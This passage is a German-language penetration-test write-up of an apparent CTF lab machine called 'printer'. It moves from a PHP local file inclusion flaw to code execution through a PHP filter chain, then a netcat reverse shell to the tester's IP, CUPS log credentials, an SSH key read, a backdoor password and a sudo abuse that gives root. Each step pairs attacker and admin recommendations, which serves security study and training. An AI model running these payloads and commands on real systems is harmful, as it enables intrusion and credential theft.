+             <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt die LFI-Logik und zeigt, dass die Verwundbarkeit im `else`-Zweig liegt, der eine direkte Inkludierung des Parameterwerts erlaubt, wenn keine entsprechende `.php`-Datei gefunden wird. Dies ermöglicht das Lesen beliebiger Dateien. Das Anhängen von `.php` könnte die direkte Inkludierung anderer PHP-Dateien erschweren, aber `php://filter` umgeht dies zum Lesen des Quellcodes.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da der Code nun bekannt ist, können gezielte Exploits entwickelt werden. Die direkte `include($page)`-Funktion ist der Schlüssel. Versuchen Sie, RCE über PHP-Filterketten zu erreichen.<br/><strong>Empfehlung (Admin):</strong> Beheben Sie die LFI durch sichere Implementierung der Dateieinbindung (z.B. Whitelisting erlaubter Seitenwerte statt direkter Pfadverwendung).</p>
+
+            <!-- Analyse der anderen PHP-Dateien (hp.php, epson.php, canon.php) -->
+            <p class="analysis"><strong>Analyse:</strong> Die Quellcodes von `hp.php`, `epson.php` und `canon.php` wurden ebenfalls über die LFI mit `php://filter` ausgelesen (wie im Berichtstext gezeigt). Sie enthalten jeweils nur einfachen Code, der ein Bild-Tag (`<img>`) mit dem Pfad zur entsprechenden Bilddatei ausgibt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Diese Skripte selbst scheinen keine weiteren Schwachstellen zu enthalten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich auf die Ausnutzung der LFI in `index.php`.<br/><strong>Empfehlung (Admin):</strong> Keine spezifischen Empfehlungen für diese einfachen Skripte, außer der Behebung der LFI in `index.php`.</p>
+
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (LFI to RCE)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Nach der Bestätigung der LFI und dem Auslesen des Quellcodes wird nun versucht, die LFI zu Remote Code Execution (RCE) zu eskalieren, um eine Shell zu erhalten.</p>
+
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="prompt">www-data@printer:/var/www/printer4life$</span> <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://printer4life.printer.hmv/index.php?page=/etc/passwd&FUZZ=id" --hh 2185 --hc 404</span></pre>
+                      <pre>
+ Target: http://printer4life.printer.hmv/index.php?page=/etc/passwd&FUZZ=id
+ [...]
+ =====================================================================
+ ID           Response   Lines    Word       Chars       Payload
+ =====================================================================
+
+ <span class="command">000000102:   200        16 L     30 W       365 Ch      "page"</span>
+
+ [...]
+ </pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein weiterer Wfuzz-Scan versucht, zusätzliche GET-Parameter zu finden, während der `page`-Parameter auf `/etc/passwd` gesetzt ist. Es wird nur der bereits bekannte `page`-Parameter gefunden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass `page` der primäre (und wahrscheinlich einzige) relevante GET-Parameter ist.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fokus auf `page`-Parameter für RCE.<br/><strong>Empfehlung (Admin):</strong> Keine.</p>
+
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>PayloadsAllTheThings
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+https://github.com/synacktiv/php_filter_chain_generator
+</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Recherche nach Methoden zur Eskalation von LFI zu RCE. Die Ressourcen "PayloadsAllTheThings" und das Tool "php_filter_chain_generator" werden erwähnt. Dies deutet auf den Plan hin, PHP-Filterketten zu verwenden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Korrekte Vorgehensweise bei der Suche nach fortgeschrittenen LFI-Exploitation-Techniken.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cycat)-[~/HackingTools/php_filter_chain_generator]
+└─# <span class="command">python3 php_filter_chain_generator.py --chain ' system($GET['cmd']); '</span></div>
+                      <pre>
+[+] The following gadget chain will generate the following code :  system($GET[cmd]);  (base64 value: PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg)
+<span class="command">http://printer4life.printer.hmv/index.php?page=php://filter/convert.iconv...convert.base64-decode/resource=php://temp</span> <!-- Stark gekürzt -->
+</pre>
+                   </div> 
+               </div>
+              <p class="analysis"><strong>Analyse:</strong> Das Tool `php_filter_chain_generator.py` wird verwendet, um eine Kette von `php://filter`-Wrappern zu generieren. Das Ziel (`--chain`) ist es, den PHP-Code ` system($GET['cmd']); ?>` auf dem Server auszuführen. Das Tool generiert eine sehr lange URL, die diese Filterkette als Wert für den `page`-Parameter enthält und `php://temp` als Ressource verwendet, um den Code einzuschleusen.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Erstellung eines komplexen Payloads zur Umgehung von LFI-Einschränkungen und zur Erzielung von RCE.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Testen Sie die generierte URL, indem Sie einen Befehl über den `cmd`-Parameter anhängen (z.B. `&cmd=id`).<br/><strong>Empfehlung (Admin):</strong> Stärkste Verteidigung ist die Behebung der LFI-Schwachstelle. Das Aktualisieren von PHP kann auch die Verfügbarkeit bestimmter Filter einschränken.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <pre><span class="command">http://printer4life.printer.hmv/index.php?page=php://filter/.../resource=php://temp&cmd=id</span> <!-- Stark gekürzt -->
+
+Select a printer 
+[...]
+<span class="password">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+</pre>
+                   </div>
+               </div>
+              <p class="analysis"><strong>Analyse:</strong> Die generierte Filterketten-URL wird aufgerufen, wobei `&cmd=id` angehängt wird. Die Antwort der Webseite enthält am Ende die Ausgabe des `id`-Befehls.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> **RCE erfolgreich bestätigt!** Die PHP-Filterkette funktioniert und erlaubt die Ausführung von Befehlen als `www-data` über den `cmd`-Parameter.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie diese RCE, um eine Reverse Shell zu etablieren.<br/><strong>Empfehlung (Admin):</strong> LFI beheben!</p>
+
+              <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                       <pre>listening on [any] 9001 ...</pre>
+                   </div>
+               </div>
+              <div class="code-block">
+                   <div class="terminal">
+                       <pre><span class="command">http://printer4life.printer.hmv/index.php?page=php://filter/.../resource=php://temp&cmd=nc%20-e%20/bin/bash%20192.168.2.199%209001</span> <!-- Stark gekürzt --> </pre>
+                   </div>
+               </div>
+              <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                       <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.123] 48298</span> <!-- Ziel-IP hier .123 statt .118? -->
+</pre>
+                   </div>
+               </div>
+              <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird auf Port 9001 gestartet. Die Filterketten-URL wird erneut aufgerufen, diesmal mit einem URL-kodierten `cmd`-Parameter, der eine Netcat-Reverse-Shell (`nc -e /bin/bash 192.168.2.199 9001`) startet. Der Listener empfängt erfolgreich die Verbindung. (Hinweis: Die im `connect`-Output angezeigte Ziel-IP `192.168.2.123` weicht von der gescannten IP `192.168.2.118` ab, möglicherweise ein Tippfehler im Bericht oder eine IP-Änderung).</p>
+              <p class="evaluation"><strong>Bewertung:</strong> **Initialer Zugriff erfolgreich erlangt!** Eine Reverse Shell als `www-data` wurde über die LFI-zu-RCE-Eskalation mittels PHP-Filterketten etabliert.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell. Beginnen Sie mit der Enumeration für die Privilegienausweitung als `www-data`.<br/><strong>Empfehlung (Admin):</strong> LFI beheben. Egress-Filtering implementieren, um ausgehende Verbindungen wie Reverse Shells zu erschweren.</p>
+
+        </section>
+
+        <section id="privilege-escalation-mabelle">
+            <h2>Privilege Escalation (mabelle)</h2>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="prompt">www-data@printer:/var/www/printer4life$</span> <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></pre>
+                      <pre>
+   412370     52 -rwsr-xr--   1 root     messagebus    51336 Oct  5  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   [...]
+   <span class="command">434892     24 -rwsr-xr-x   1 root     root          23448 Jan 13  2022 /usr/bin/pkexec</span>
+   [...]
+   <span class="command">434904    180 -rwsr-xr-x   1 root     root         182600 Jan 14  2023 /usr/bin/sudo</span>
+   [...]
+ </pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Als `www-data` wird nach SUID-Binaries gesucht. Die Liste enthält Standard-Binaries sowie `pkexec` und `sudo`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Keine sofort offensichtlichen ungewöhnlichen SUID-Dateien. Weitere Enumeration ist nötig.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie `sudo -l`. Suchen Sie nach lesbaren Logdateien oder Konfigurationsdateien, die Passwörter enthalten könnten.<br/><strong>Empfehlung (Admin):</strong> Minimieren Sie SUID-Binaries.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <pre><span class="prompt">www-data@printer:/var/www/printer4life$</span> <span class="command">grep mabelle access_log</span></pre> <!-- Annahme: Befehl in /var/log/cups oder /var/log/apache2 ausgeführt -->
+                      <pre>I [22/Apr/2023:07:41:47 +0200] cupsdCheckAuth: Authenticated as mabelle with password <span class="password">LIrmxk8EYtD</span></pre>
+                      <pre><span class="prompt">www-data@printer:/var/www/printer4life$</span> <span class="command">grep root access_log</span></pre>
+                      <pre>D [22/Apr/2023:07:41:47 +0200] cupsdIsAuthorized: requesting-user-name="root"
+ [...]
+ </pre>
+                   </div>
+               </div>
+              <p class="analysis"><strong>Analyse:</strong> Bei der Untersuchung von Logdateien (vermutlich CUPS-Logs in `/var/log/cups/access_log`, da CUPS-Authentifizierung erwähnt wird) wird eine Zeile gefunden, die eine erfolgreiche Authentifizierung für den Benutzer `mabelle` mit dem Passwort `<span class="password">LIrmxk8EYtD</span>` im Klartext protokolliert.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> **Kritischer Fund! Passwort im Klartext in Logdatei.** Dies ermöglicht die direkte Übernahme des `mabelle`-Accounts.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie `su mabelle` oder SSH mit dem gefundenen Passwort.<br/><strong>Empfehlung (Admin):</strong> **Beheben Sie sofort das Logging von Klartext-Passwörtern!** Überprüfen Sie die CUPS-Konfiguration (`cupsd.conf`, insbesondere `LogLevel`) und andere Logging-Konfigurationen. Ändern Sie das Passwort von `mabelle`.</p>
+
+              <div class="code-block">
+                   <div class="terminal">
+                       <pre><span class="prompt">www-data@printer:/var/www/printer4life$</span> <span class="command">su mabelle</span></pre>
+                       <pre>Password: <span class="password">LIrmxk8EYtD</span>
+<span class="prompt">mabelle@printer:/var/www/printer4life$</span> </pre>
+                    </div>
+                </div>
+               <p class="analysis"><strong>Analyse:</strong> Erfolgreicher Wechsel zum Benutzer `mabelle` mit dem aus der Logdatei extrahierten Passwort.</p>
+               <p class="evaluation"><strong>Bewertung:</strong> Privilegien von `www-data` zu `mabelle` eskaliert.</p>
+               <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Enumerieren Sie als `mabelle`. Überprüfen Sie Home-Verzeichnis, SSH-Schlüssel, Gruppen, `sudo -l`.<br/><strong>Empfehlung (Admin):</strong> Passwort ändern, Logging korrigieren.</p>
+
+              <div class="code-block">
+                   <div class="terminal">
+                       <pre><span class="prompt">mabelle@printer:/var/www/printer4life$</span> <span class="command">cd ~</span></pre>
+                       <pre><span class="prompt">mabelle@printer:~$</span> <span class="command">ls -la</span></pre>
+                       <pre>
+ total 32
+ drwxr-xr-x 4 mabelle mabelle 4096 May 20 08:50 .
+ drwxr-xr-x 4 root    root    4096 Apr 22 08:33 ..
+ lrwxrwxrwx 1 root    root       9 Apr 14 20:51 .bash_history -> /dev/null
+ -rw-r--r-- 1 mabelle mabelle  220 Apr 14 20:50 .bash_logout
+ -rw-r--r-- 1 mabelle mabelle 3526 Apr 14 20:50 .bashrc
+ drwxr-xr-x 3 mabelle mabelle 4096 May 20 08:50 .local
+ -rw-r--r-- 1 mabelle mabelle 2602 Apr 22 08:16 <span class="command">mabelle_private_ssh_key</span>
+ -rw-r--r-- 1 mabelle mabelle  807 Apr 14 20:50 .profile
+ drwx------ 2 mabelle mabelle 4096 Apr 22 08:15 <span class="command">.ssh</span>
+ </pre>
+                   </div>
+               </div>
+              <div class="code-block">
+                   <div class="terminal">
+                       <pre><span class="prompt">mabelle@printer:~$</span> <span class="command">cd .ssh/</span></pre>
+                       <pre><span class="prompt">mabelle@printer:~/.ssh$</span> <span class="command">ls -la</span></pre>
+                       <pre>
+ total 16
+ drwx------ 2 mabelle mabelle 4096 Apr 22 08:15 .
+ drwxr-xr-x 4 mabelle mabelle 4096 May 20 08:50 ..
+ -rw-r--r-- 1 mabelle mabelle  573 Apr 20 06:15 authorized_keys
+ -rw------- 1 mabelle mabelle 2602 Apr 20 06:15 <span class="command">id_rsa</span>
+ </pre>
+                    </div>
+                </div>
+               <div class="code-block">
+                   <div class="terminal">
+                       <pre><span class="prompt">mabelle@printer:~/.ssh$</span> <span class="command">cat id_rsa</span></pre>
+                       <pre>-----BEGIN OPENSSH PRIVATE KEY-----
+<span class="command">[KEY DATA]</span>
+-----END OPENSSH PRIVATE KEY-----</pre>
+                    </div>
+                </div>
+               <p class="analysis"><strong>Analyse:</strong> Im Home-Verzeichnis von `mabelle` wird die Datei `mabelle_private_ssh_key` gefunden, die identisch mit `~/.ssh/id_rsa` zu sein scheint. Der private SSH-Schlüssel von `mabelle` wird ausgelesen.</p>
+               <p class="evaluation"><strong>Bewertung:</strong> Ermöglicht einen direkten SSH-Login als `mabelle` und bietet eine stabilere Verbindung.</p>
+               <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kopieren Sie den Schlüssel (`id_rsa`) auf Ihre lokale Maschine, setzen Sie die Berechtigungen (`chmod 600 id_rsa`) und verwenden Sie `ssh mabelle@printer.hmv -i id_rsa` für den Login.<br/><strong>Empfehlung (Admin):</strong> Schützen Sie private SSH-Schlüssel mit Passphrasen. Stellen Sie sicher, dass private Schlüssel nicht unnötigerweise im Home-Verzeichnis herumliegen.</p>
+
+                <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">ssh mabelle@printer.hmv -i id_rsa</span></div>
+                       <pre>
+ [...]
+ Linux printer.hmv 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
+ [...]
+ Last login: Sat May 20 09:05:20 2023 from 192.168.0.10
+ <span class="prompt">mabelle@printer:~$</span> </pre>
+                    </div>
+                </div>
+               <p class="analysis"><strong>Analyse:</strong> Erfolgreicher SSH-Login als `mabelle` unter Verwendung des extrahierten privaten Schlüssels.</p>
+               <p class="evaluation"><strong>Bewertung:</strong> Stabile Sitzung als `mabelle` etabliert.</p>
+
+               <div class="code-block">
+                   <div class="terminal">
+                       <pre><span class="prompt">mabelle@printer:~$</span> <span class="command">sudo -l</span></pre>
+                       <pre>[sudo] password for mabelle: <span class="password">LIrmxk8EYtD</span>
+Sorry, user mabelle may not run sudo on printer.
+</pre>
+                    </div>
+                </div>
+               <p class="analysis"><strong>Analyse:</strong> `sudo -l` zeigt, dass `mabelle` keine `sudo`-Rechte hat.</p>
+               <p class="evaluation"><strong>Bewertung:</strong> Kein direkter Weg zur Eskalation über `sudo` für `mabelle`.</p>
+
+               <div class="code-block">
+                   <div class="terminal">
+                       <pre><span class="prompt">mabelle@printer:~$</span> <span class="command">getcap -r / 2>/dev/null</span></pre>
+                       <pre><span class="prompt">mabelle@printer:~$</span> </pre> <!-- Leere Ausgabe -->
+                    </div>
+                </div>
+               <p class="analysis"><strong>Analyse:</strong> Suche nach Dateien mit gesetzten Linux Capabilities ergibt keine Treffer.</p>
+               <p class="evaluation"><strong>Bewertung:</strong> Kein Eskalationspfad über Capabilities gefunden.</p>
+
+               <div class="code-block">
+                   <div class="terminal">
+                       <pre><span class="prompt">mabelle@printer:~$</span> <span class="command">id</span></pre>
+                       <pre>uid=1000(mabelle) gid=1000(mabelle) groups=1000(mabelle),<span class="command">1001(lpadmin)</span></pre>
+                    </div>
+                </div>
+               <p class="analysis"><strong>Analyse:</strong> Der `id`-Befehl zeigt, dass `mabelle` Mitglied der Gruppe `lpadmin` ist.</p>
+               <p class="evaluation"><strong>Bewertung:</strong> Die Mitgliedschaft in `lpadmin` ist relevant, da diese Gruppe oft erweiterte Rechte im CUPS-System hat.</p>
+               <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie, welche Aktionen Mitglieder der `lpadmin`-Gruppe durchführen können (z.B. Drucker hinzufügen/konfigurieren, Filter ändern). Suchen Sie nach lokalen Diensten oder Backdoors, die möglicherweise ausgenutzt werden können.<br/><strong>Empfehlung (Admin):</strong> Weisen Sie Benutzer nur den Gruppen zu, die sie wirklich benötigen. Überprüfen Sie die Standardberechtigungen der `lpadmin`-Gruppe.</p>
+
+        </section>
+
+        <section id="privilege-escalation-kierra">
+            <h2>Privilege Escalation (kierra)</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="prompt">mabelle@printer:/home/kierra$</span> <span class="command">ss -atlpn</span></pre>
+                      <pre>
+ State     Recv-Q    Send-Q         Local Address:Port         Peer Address:Port    Process
+ LISTEN    0         10                 <span class="command">127.0.0.1:1001</span>              0.0.0.0:*
+ LISTEN    0         128                  0.0.0.0:22                0.0.0.0:*
+ LISTEN    0         128                  0.0.0.0:631               0.0.0.0:*
+ LISTEN    0         511                        *:80                      *:*
+ LISTEN    0         128                     [::]:22                   [::]:*
+ </pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> `ss -atlpn` listet lauschende TCP-Ports auf. Neben den bekannten Ports 22, 80 und 631 wird ein Dienst auf Port 1001 gefunden, der nur auf der Loopback-Adresse (`127.0.0.1`) lauscht.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Ein nur lokal erreichbarer Dienst ist oft für interne Kommunikation oder manchmal eine versteckte Funktion oder Backdoor.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verbinden Sie sich lokal mit `telnet` oder `nc` zu `127.0.0.1` auf Port 1001, um herauszufinden, was dort lauscht.<br/><strong>Empfehlung (Admin):</strong> Überprüfen Sie regelmäßig lauschende Ports, insbesondere solche, die nur lokal gebunden sind. Stellen Sie sicher, dass keine unnötigen oder unsicheren Dienste laufen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="prompt">mabelle@printer:~$</span> <span class="command">telnet 127.0.0.1 1001</span></pre>
+                      <pre>
+I put a backdoor in a printer filter.
+
+Filter name: <span class="password">root</span>
+You need to wait at least 60 seconds between attempts.
+</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Eine Telnet-Verbindung zu Port 1001 wird hergestellt. Der Dienst antwortet mit einer Nachricht, die explizit eine Backdoor in einem Druckerfilter erwähnt und nach dem Filternamen fragt. Ein Beispiel ("root") wird gegeben, und es gibt eine Wartezeit zwischen Versuchen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigung einer Backdoor. Ziel ist es, den korrekten CUPS-Filter-Namen zu erraten oder zu finden, um möglicherweise ein Passwort oder einen anderen Hinweis zu erhalten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Listen Sie die CUPS-Filter auf (z.B. in `/usr/lib/cups/filter/` oder `/opt/cups-2.3.3/filter/`, wie im Text angedeutet) und probieren Sie die Namen mit diesem Telnet-Dienst aus.<br/><strong>Empfehlung (Admin):</strong> Entfernen Sie die Backdoor! Untersuchen Sie, wie sie auf das System gelangt ist. Überprüfen Sie alle CUPS-Filter auf Modifikationen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="prompt">mabelle@printer:/opt/cups-2.3.3$</span> <span class="command">ls -la /opt/cups-2.3.3/filter/</span></pre> <!-- Pfad ist ungewöhnlich, aber im Text angegeben -->
+                      <pre>
+ [...]
+ -rw-r--r--  1  501 staff  24526 Feb  6 19:34 <span class="command">rastertoepson.c</span>
+ -rw-r--r--  1 root root  104192 Feb  6 19:34 rastertoepson.o
+ -rw-r--r--  1  501 staff  18977 Feb  6 19:34 <span class="command">rastertohp.c</span>
+ -rw-r--r--  1 root root   94120 Feb  6 19:34 rastertohp.o
+ -rw-r--r--  1  501 staff  27170 Feb  6 19:34 <span class="command">rastertolabel.c</span>
+ [...]
+ </pre> <!-- Weitere Filter werden impliziert -->
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt eines CUPS-Filter-Verzeichnisses (hier `/opt/cups-2.3.3/filter/`) wird aufgelistet, um mögliche Filternamen für die Backdoor zu finden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Liefert Kandidaten für die Backdoor-Eingabe.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="prompt">mabelle@printer:~$</span> <span class="command">telnet 127.0.0.1 1001</span></pre>
+                      <pre>
+ I put a backdoor in a printer filter.
+
+ Filter name: <span class="command">rastertopwg.c</span>
+
+ You are awesome! Here is the password: <span class="password">wK4EyQ15Cga</span>
+
+ Connection closed by foreign host.
+ </pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Erneute Verbindung zum Backdoor-Dienst. Der Filtername `rastertopwg.c` (oder eventuell nur `rastertopwg`) wird eingegeben. Der Dienst antwortet mit einer Erfolgsmeldung und gibt ein Passwort preis: `<span class="password">wK4EyQ15Cga</span>`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Passwort gefunden!** Dies ist sehr wahrscheinlich das Passwort für den Benutzer `kierra`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie `su kierra` mit diesem Passwort.<br/><strong>Empfehlung (Admin):</strong> Backdoor entfernen, Passwort von `kierra` ändern.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="prompt">mabelle@printer:/opt/cups-2.3.3$</span> <span class="command">su kierra</span></pre>
+                     <pre>Password: <span class="password">wK4EyQ15Cga</span>
+<span class="prompt">kierra@printer:/opt/cups-2.3.3$</span> </pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Erfolgreicher Wechsel zum Benutzer `kierra` mit dem über die Backdoor erhaltenen Passwort.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Privilegien von `mabelle` zu `kierra` eskaliert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Enumerieren Sie als `kierra`. Lesen Sie `user.txt`. Prüfen Sie `sudo -l`.<br/><strong>Empfehlung (Admin):</strong> Passwort ändern, Backdoor entfernen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="prompt">kierra@printer:/opt/cups-2.3.3$</span> <span class="command">sudo -l</span></pre>
+                      <pre>
+ [sudo] password for kierra: <span class="password">wK4EyQ15Cga</span>
+ Matching Defaults entries for kierra on printer:
+     env_reset, mail_badpass,
+     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+ User kierra may run the following commands on printer:
+     <span class="command">(ALL : ALL) /usr/lib/cups/filter/rastertopwg</span>
+ </pre>
+                   </div>
+               </div>
+              <p class="analysis"><strong>Analyse:</strong> `sudo -l` zeigt, dass `kierra` den CUPS-Filter `/usr/lib/cups/filter/rastertopwg` als jeder Benutzer (`ALL : ALL`), einschließlich `root`, ausführen darf.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> **Klarer Pfad zur Root-Eskalation!** Diese `sudo`-Regel ist extrem unsicher, da sie die Ausführung eines potenziell komplexen Programms mit Root-Rechten erlaubt.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Recherchieren Sie, wie der `rastertopwg`-Filter für Command Execution missbraucht werden kann, wenn er mit `sudo` ausgeführt wird. Prüfen Sie GTFOBins. Versuchen Sie, Befehle über Argumente einzuschleusen.<br/><strong>Empfehlung (Admin):</strong> **Unsichere sudo-Regel sofort entfernen oder korrigieren!** Erlauben Sie niemals die Ausführung von komplexen Programmen oder Filtern als `ALL:ALL`.</p>
+
+        </section>
+
+        <section id="privilege-escalation-root">
+            <h2>Privilege Escalation (root)</h2>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="prompt">kierra@printer:/opt/cups-2.3.3$</span> <span class="command">sudo -u root /usr/lib/cups/filter/rastertopwg exec:id</span></pre>
+                      <pre><span class="password">uid=0(root) gid=0(root) groups=0(root)</span>
+Usage: rastertopwg job user title copies options [filename]
+</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, die `sudo`-Regel auszunutzen. Der `rastertopwg`-Filter wird als `root` ausgeführt. Als Argument wird `exec:id` übergeben. Interessanterweise wird trotz einer ausgegebenen "Usage"-Meldung der `id`-Befehl ausgeführt und die Ausgabe `uid=0(root)` angezeigt. Dies deutet auf eine undokumentierte oder fehlerhafte Argumentverarbeitung hin, die zur Befehlsausführung führt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Schwachstelle im Filter (oder dessen Aufruf über sudo) wird bestätigt. Befehlsausführung als Root ist möglich.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie diese Methode, um eine Root-Shell zu erhalten, z.B. mit `exec:/bin/bash -p`.<br/><strong>Empfehlung (Admin):</strong> Sudo-Regel beheben. CUPS-Filter untersuchen.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <pre><span class="prompt">kierra@printer:/opt/cups-2.3.3$</span> <span class="command">sudo -u root /usr/lib/cups/filter/rastertopwg exec:/bin/bash -p</span></pre>
+                      <pre><span class="prompt">root@printer:/opt/cups-2.3.3#</span> <span class="command">id</span></pre>
+                      <pre>uid=0(root) gid=0(root) groups=0(root)</pre>
+                   </div>
+               </div>
+              <p class="analysis"><strong>Analyse:</strong> Der `rastertopwg`-Filter wird erneut als `root` ausgeführt, diesmal mit `exec:/bin/bash -p` als Argument. Dies startet erfolgreich eine interaktive Root-Shell (`-p` erhält die Root-Rechte).</p>
+              <p class="evaluation"><strong>Bewertung:</strong> **Root-Zugriff erfolgreich erlangt!** Die unsichere `sudo`-Regel und die ausnutzbare Filterfunktion wurden erfolgreich kombiniert.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Holen Sie die Root-Flagge und die User-Flagge.<br/><strong>Empfehlung (Admin):</strong> Sudo-Regel beheben.</p>
+
+              <div class="code-block">
+                   <div class="terminal">
+                       <pre><span class="prompt">root@printer:/opt/cups-2.3.3#</span> <span class="command">cd ~</span></pre>
+                       <pre><span class="prompt">root@printer:~#</span> <span class="command">ls</span></pre>
+                       <pre>root_flag.txt</pre>
+                       <pre><span class="prompt">root@printer:~#</span> <span class="command">cat root_flag.txt</span></pre>
+                       <pre><span class="password">052cf26a6e7e33790391c0d869e2e40c</span></pre>
+                   </div>
+               </div>
+              <p class="analysis"><strong>Analyse:</strong> Als Root wird ins `/root`-Verzeichnis gewechselt und die Root-Flagge aus `root_flag.txt` gelesen.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Root-Flagge gefunden.</p>
+
+              <div class="code-block">
+                   <div class="terminal">
+                       <pre><span class="prompt">root@printer:~#</span> <span class="command">cat /home/kierra/user.txt</span></pre>
+                       <pre><span class="password">63e2f2ec7e3dbae87afc4e0e86d0867b</span></pre>
+                   </div>
+               </div>
+              <p class="analysis"><strong>Analyse:</strong> Als Root wird nun die User-Flagge aus dem Home-Verzeichnis von `kierra` gelesen, was zuvor als `mabelle` nicht möglich war.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> User-Flagge gefunden.</p>
+
+        </section>
+
+        <section id="poc-lfi-rce">
+            <h2>Proof of Concept: LFI to RCE</h2>
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Auf der Subdomain `printer4life.printer.hmv` wurde in der Datei `index.php` eine Local File Inclusion (LFI)-Schwachstelle im GET-Parameter `page` identifiziert. Die Analyse des Quellcodes (erhalten durch `php://filter/convert.base64-encode/resource=index.php`) zeigte, dass der Parameterwert direkt in eine `include()`-Funktion übergeben wird, wenn keine gleichnamige `.php`-Datei existiert. Diese LFI wurde mittels PHP-Filterketten (generiert durch `php_filter_chain_generator.py`) zu Remote Code Execution (RCE) eskaliert. Eine speziell konstruierte URL ermöglichte die Ausführung beliebiger Befehle über einen zusätzlichen GET-Parameter (`cmd`).</p>
+            <p class="evaluation"><strong>Voraussetzungen:</strong> Zugriff auf die Subdomain `printer4life.printer.hmv`, LFI-Schwachstelle im `page`-Parameter, Tool zur Generierung von PHP-Filterketten.</p>
+            <p class="analysis"><strong>Schritt-für-Schritt-Anleitung:</strong>
+                1. LFI identifizieren: `http://printer4life.printer.hmv/index.php?page=/etc/passwd` zeigt Dateiinhalt.
+                2. PHP-Filterkette generieren, um `<?php system($GET['cmd']); ?>` auszuführen: `python3 php_filter_chain_generator.py --chain '<?php system($GET['cmd']); ?>'` -> Erzeugt `CHAIN_URL`.
